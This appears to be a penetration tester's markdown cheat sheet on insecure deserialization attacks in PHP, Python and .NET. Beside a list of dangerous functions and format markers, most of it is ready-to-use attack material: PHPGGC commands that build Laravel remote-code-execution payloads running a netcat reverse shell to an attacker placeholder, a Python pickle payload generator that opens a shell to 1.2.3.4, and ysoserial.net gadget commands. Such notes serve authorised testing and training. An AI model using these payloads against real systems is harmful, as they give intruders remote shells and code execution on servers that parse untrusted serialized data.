#web #deserialization #rce #phpggc #ysoserial

# Deserialization Attacks

Related: [sqli-advanced](sqli-advanced.md) · [whitebox](../CodeReview/whitebox.md) · [shells-payloads](../Tools/shells-payloads.md)

## Identify Sinks (white-box)
```
PHP: unserialize()   Python: pickle.loads() / yaml.load()
Java: readObject()   .NET: Deserialize()   Ruby: Marshal.load()
```
Dangerous deserialization functions to grep for.

## Identify Format (black-box)
```
PHP:  a:4:{i:0;s:4:"Test";...}
Java: AC ED 00 05 (hex) / rO0 (base64)
.NET: AAEAAAD///// (base64) / contains $type
Python pickle: 80 04 95 (protocol 4)
```
Magic bytes / markers by language.

## PHP — PHPGGC
```bash
phpggc -l Laravel
```
List gadget chains for a framework.

```bash
phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b
```
Generate a base64 RCE payload.

```bash
phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.phar
```
Generate a PHAR deserialization payload. See [file-inclusion](file-inclusion.md).

## Python — Pickle
```python
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return os.system, ("nc -nv 1.2.3.4 5555 -e /bin/bash",)
print(base64.b64encode(pickle.dumps(RCE())).decode())
```
Pickle `__reduce__` RCE payload generator.

## .NET — ysoserial.net
```powershell
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "notepad" -o Raw
```
Generate a .NET gadget payload (`-f` formatter, `-g` gadget, `-c` command, `-o` output).

```powershell
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'notepad' -o base64
```
BinaryFormatter + TypeConfuseDelegate gadget.
